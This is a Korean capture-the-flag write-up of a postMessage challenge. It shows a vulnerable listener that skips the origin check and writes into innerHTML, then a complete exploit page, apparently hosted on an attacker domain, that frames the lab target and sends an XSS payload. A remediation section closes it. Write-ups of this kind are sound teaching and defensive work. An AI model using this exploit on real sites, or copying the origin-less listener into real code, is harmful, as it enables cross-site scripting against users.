+++
title = "VulnABLE CTF [LUXORA] Write-up: PostMessage Abuse 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "PostMessage", "Bronze", "DOM XSS", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: PostMessage Abuse 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Client-Side Layer (PostMessage Abuse)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/postmsg/bronze`
- **목표**: 타겟 페이지가 외부 윈도우(Iframe 등)로부터 전달받는 `postMessage` 데이터에 대해 **출처(Origin)**를 검증하지 않는 취약점을 이용하여, 악의적인 메시지를 보내 DOM 기반 XSS를 실행하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 소스코드 분석 (Reconnaissance)

`/postmsg/bronze` 페이지는 팝업 창이나 Iframe과 통신하기 위해 HTML5의 `window.postMessage` API를 사용하고 있습니다. 

페이지의 자바스크립트 소스코드를 분석해 봅니다. (F12 -> Elements 탭)

**[타겟 웹 페이지의 수신 코드]**
```html
<div id="message_box">Waiting for messages...</div>

<script>
  window.addEventListener("message", function(event) {
      // 보안 결함: event.origin 을 전혀 검사하지 않음!
      
      const data = event.data;
      if (data.type === 'updateText') {
          // 보안 결함: 전달받은 텍스트를 innerHTML로 안전하지 않게 삽입
          document.getElementById('message_box').innerHTML = data.content;
      }
  });
</script>
```

**[해커의 사고 과정]**
1. 이 페이지는 다른 윈도우(부모 창이나 Iframe)가 보내는 메시지를 수신하기 위해 `message` 이벤트 리스너를 열어두고 있다.
2. 하지만 `event.origin` (메시지를 보낸 사이트의 주소)이 자신이 신뢰하는 사이트인지 **전혀 검사하지 않고 있다!**
3. 즉, 내(해커)가 운영하는 웹사이트에서 이 페이지를 iframe으로 열고 `postMessage`를 보내면, 저 스크립트는 군말 없이 메시지를 받아서 처리할 것이다.
4. 더구나 화면에 값을 쓸 때 `innerHTML`을 사용하고 있으니, XSS 공격이 직빵으로 통하겠구나!

---

## 💥 2. 취약점 식별 및 악성 페이지 제작 (Exploitation)

목표는 타겟 사이트 내부의 `innerHTML` Sink로 우리의 악성 자바스크립트(XSS)를 밀어 넣는 것입니다.

### 💡 악성 HTML(Exploit) 설계
해커 서버(`evil-attacker.com`)에 다음과 같은 HTML 페이지를 만듭니다.

```html
<!DOCTYPE html>
<html>
<head>
    <title>PostMessage Exploit</title>
</head>
<body>
    <h1>Exploiting PostMessage...</h1>
    
    <!-- 타겟 사이트를 iframe으로 로드 -->
    <iframe id="targetFrame" src="http://localhost:3000/postmsg/bronze" width="500" height="300"></iframe>

    <script>
        // iframe이 완전히 로드된 후 메시지를 전송해야 함
        document.getElementById('targetFrame').onload = function() {
            const targetWin = this.contentWindow;
            
            // XSS 페이로드를 담은 메시지 객체 생성
            const maliciousData = {
                type: 'updateText',
                content: '<img src="x" onerror="alert(\'POSTMSG_XSS\')">'
            };
            
            // 타겟 윈도우로 메시지 발송! (두 번째 인자 '*'는 아무 도메인이나 받으라는 뜻)
            targetWin.postMessage(maliciousData, '*');
        };
    </script>
</body>
</html>
```

---

## 🚀 3. 공격 수행 및 결과 확인

### Step 1. 희생자 유도
이 공격 페이지의 링크를 피해자에게 보내 접속하도록 유도합니다.

### Step 2. 브라우저 내부 동작 흐름
1. 피해자의 브라우저가 해커의 사이트를 엽니다.
2. 타겟 페이지(`/postmsg/bronze`)가 iframe 내부에서 로드됩니다.
3. 로드가 끝나자마자 해커의 스크립트가 `postMessage`를 통해 악성 객체를 타겟 페이지로 쏩니다.
4. 타겟 페이지의 `message` 이벤트 리스너가 이를 수신합니다. 출처(Origin)를 따지지 않으므로, 해커가 보낸 메시지가 곧바로 `innerHTML`에 삽입됩니다!

### 🔍 공격 결과
타겟 사이트의 DOM이 조작되면서 XSS 경고창이 뜨고, 챌린지가 클리어됩니다.

```text
[!] System: Insecure PostMessage received and executed.
FLAG: FLAG{POSTMSG_🥉_NO_ORIGIN_CHECK_A1B2C3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

HTML5의 강력한 Cross-Origin 통신 도구인 `postMessage`를 사용할 때, 메시지의 **발신자(Origin)**를 확인하지 않는 사소한 방심이 타 도메인에서의 완벽한 XSS 공격으로 이어짐을 입증했습니다.

**🔥 획득한 플래그:**
`FLAG{POSTMSG_🥉_NO_ORIGIN_CHECK_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
메시지를 받을 때 `event.origin` 검증을 누락한 것과, 데이터를 화면에 그릴 때 안전하지 않은 Sink(`innerHTML`)를 사용한 것이 원인입니다.

* **안전한 패치 가이드 (Origin 검증 의무화)**
이벤트 리스너의 최상단에서 **반드시 허용된 출처인지 검사**해야 합니다.
```javascript
window.addEventListener("message", function(event) {
    // 1. 발신자의 도메인(Origin)을 엄격하게 검증 (화이트리스트 방식)
    const allowedOrigins = ["https://www.luxora.test", "https://trusted-partner.com"];
    if (!allowedOrigins.includes(event.origin)) {
        console.warn("Untrusted message origin blocked:", event.origin);
        return; // 신뢰할 수 없으면 즉시 종료
    }
    
    const data = event.data;
    if (data.type === 'updateText') {
        // 2. innerHTML 대신 안전한 textContent 사용
        document.getElementById('message_box').textContent = data.content;
    }
});
```
또한, 메시지를 **보낼 때**에도 `postMessage(data, '*')` 처럼 와일드카드를 쓰지 말고, 수신자의 정확한 도메인을 `postMessage(data, 'https://www.luxora.test')` 로 명시하여 중간자 공격(MITM)이나 정보 유출을 막아야 합니다.